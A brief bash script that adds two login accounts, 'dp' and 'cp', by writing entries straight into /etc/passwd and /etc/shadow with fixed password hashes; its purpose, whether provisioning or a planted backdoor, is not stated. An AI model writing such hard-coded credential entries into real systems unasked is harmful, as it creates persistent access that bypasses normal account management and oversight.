#!/bin/bash

FILE_PASSWD="/etc/passwd"
FILE_SHADOW="/etc/shadow"

grep dp $FILE_PASSWD -rnw > /dev/null
if [ $? -eq 1 ]; then
	echo "dp:x:1001:1001::/home/dp:/bin/bash" >> $FILE_PASSWD
fi

grep cp $FILE_PASSWD -rnw > /dev/null
if [ $? -eq 1 ]; then
	echo "cp:x:1002:1002::/home/cp:/bin/bash" >> $FILE_PASSWD
fi

grep dp $FILE_SHADOW -rnw > /dev/null
if [ $? -eq 1 ]; then
	echo "dp:\$6\$EeHD14zz\$vcPsm135HqN/u1s4XPkymRiybS5Eul1Nn2e2TY7m6kC89ILfO7WUpgC8/sRRigENDvBSA1sNzSln2LtSdaVoV0:17036:0:99999:7:::" >> $FILE_SHADOW
fi

grep cp $FILE_SHADOW -rnw > /dev/null
if [ $? -eq 1 ]; then
	echo "cp:\$6\$PpZJtsum\$R0XeR33yqomTq0qi2g0syVH1v4cdOMATW5lgZpecTpAcNFda0E9hYBJJqDM3zlD2PsHv34VChVCWyUgD6ZbQd/:17036:0:99999:7:::" >> $FILE_SHADOW
fi
